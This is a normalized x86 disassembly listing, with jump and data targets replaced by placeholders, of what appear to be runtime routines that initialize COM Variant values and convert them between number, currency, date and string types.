mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404290
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_40ae94
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4112ef
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0xc ]
call sub_4046e8
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_404290
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_4094a8
test al al
je r-xdata
mov dx [ ebx ]
mov cx 0x7
call sub_40e9b4
jmp r-xdata
mov dx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_40e9b4
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_4112f8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40e9b4
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411358
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40e9b4
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_4113a4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4113f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f080
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411454
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411400
lea eax [ ebp - 0x18 ]
call sub_40ed58
retn
sub_411408
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41426c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411454
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411470 ]
mov eax ebx
call sub_41120c
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411358
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_41120c
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_4112f8
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411454
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411358
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_4113a4
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_40e520
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411408
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411358
fstp [ esp ]
fwait
mov eax ebx
call sub_411358
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_41163b ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411358
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_41120c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_4112f8
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411454
fstp [ esp ]
fwait
jmp r-xdata
sub_4117a4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411850
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412798
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_404290
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
call sub_409500
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411857
lea eax [ ebp - 0x10 ]
call sub_404008
lea eax [ ebp - 0xc ]
call sub_4046e8
retn
mov dx [ ebx ]
mov cx 0x6
mov eax 0x80020005
call sub_40e9b4
jmp r-xdata
mov dx [ ebx ]
mov cx 0x6
call sub_40e9b4
jmp r-xdata
sub_411860
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40e9b4
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4118c0
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40e9b4
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_41190c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411961
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f080
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_4119bc
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411968
lea eax [ ebp - 0x18 ]
call sub_40ed58
retn
sub_411970
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41426c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_4119bc
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4119d8 ]
mov eax ebx
call sub_4117a4
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4118c0
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_4118c0
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4117a4
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411860
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4119bc
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4118c0
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_41190c
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_40e520
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411970
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_4118c0
fistp [ esp ]
fwait
mov eax ebx
call sub_4118c0
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411bdd ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4118c0
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_4118c0
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4117a4
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411860
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4119bc
fistp [ esp ]
fwait
jmp r-xdata
sub_411d88
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4046e8
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40e9b4
pop ebx
pop ebp
retn 0x8
sub_411dc0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4046e8
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40e9b4
pop ebx
pop ebp
retn 0x8
sub_411df8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_411eae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4046e8
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40e9b4
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411eb5
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40402c
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_404290
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407d84
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404834
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_404290
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407d48
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_404834
jmp r-xdata
jmp r-xdata
call sub_40e5bc
sub_411ebc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_411f7b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411f59
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40e9b4
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4047f8
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048e4
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404290
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411f60
lea eax [ ebp - 0x10 ]
call sub_40ed58
retn
sub_411f88
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411fde
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f080
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412070
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411fe5
lea eax [ ebp - 0x10 ]
call sub_40ed58
retn
sub_411fec
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_41426c
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412061
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_40405c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40ed58
retn
sub_412070
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4125a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4120a9 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40405c
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404008
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_408030
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_40405c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408030
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40405c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_40942c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40405c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40942c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_40405c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_411d88
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404290
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_411dc0
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404290
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_4047f8
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048e4
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_404290
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_411df8
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404290
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_408030
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_40405c
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_408030
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_40405c
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_408030
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_40405c
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_40811c
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_40405c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_40811c
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_40405c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412070
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_411ebc
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_40405c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4125ae
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_40402c
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_404700
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_40402c
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_404700
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40402c
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_411f88
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_40405c
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40405c
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e520
test ah 0x40
je r-xdata
mov eax esi
call sub_404008
mov edx eax
mov eax ebx
call sub_411fec
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_411ebc
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_40405c
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_411ebc
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_40405c
jmp r-xdata
jmp [ eax * 4 + jump_table_41233d ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408030
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_40405c
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_408030
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_40405c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_40942c
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_40405c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_40942c
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_40405c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_411d88
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404290
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_411dc0
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404290
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404230
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_411df8
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404290
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408030
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_40405c
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408030
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_40405c
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408030
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_40405c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_40811c
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_40405c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_40811c
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_40405c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412070
jmp r-xdata
sub_4125b4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41265e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412641
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40e9b4
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4047f8
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412648
lea eax [ ebp - 0x10 ]
call sub_40ed58
retn
sub_41266c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4126c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f080
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412798
xor eax eax
pop edx
